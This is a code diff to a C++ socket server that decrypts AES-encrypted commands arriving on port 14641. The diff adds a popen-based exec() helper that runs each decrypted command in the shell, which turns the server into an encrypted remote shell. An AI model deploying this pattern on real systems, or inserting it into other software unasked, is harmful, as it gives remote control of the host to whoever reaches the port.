@@ -7,12 +7,30 @@ extern "C" {
 #include<netdb.h>
 #include<unistd.h>
 #include<vector>
+#include<memory>
+#include<stdexcept>
+#include<string>
+#include<array>
+#include<cstdio>
 #include "crypto/crypto.h"
 #include "crypto/hashing/sha256.h"
 #include "crypto/aes/aes.h"
 
 constexpr auto PORT = "14641";
 constexpr auto BACKLOG = 10;
+
+std::string exec(const char* cmd) {
+    std::array<char, 128> buffer;
+    std::string result;
+    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
+    if (!pipe) {
+        throw std::runtime_error("popen() failed!");
+    }
+    while (fgets(buffer.data(), static_cast<int>(buffer.size()), pipe.get()) != nullptr) {
+        result += buffer.data();
+    }
+    return result;
+}
 
 int create_and_bind_socket(const std::string& port){
     /*
@@ -147,6 +165,8 @@ void command_loop(int new_sockfd, std::string symmetric_key){
         std::string dec_command = aes_ctr(std::string(enc_command.begin(), enc_command.end()), symmetric_key, iv);
         std::cout << dec_command << std::endl;
 
+        std::string output = exec(dec_command.c_str());
+        std::cout << "Output: " << '\n' << output << '\n';
     }
     close(new_sockfd);
 }
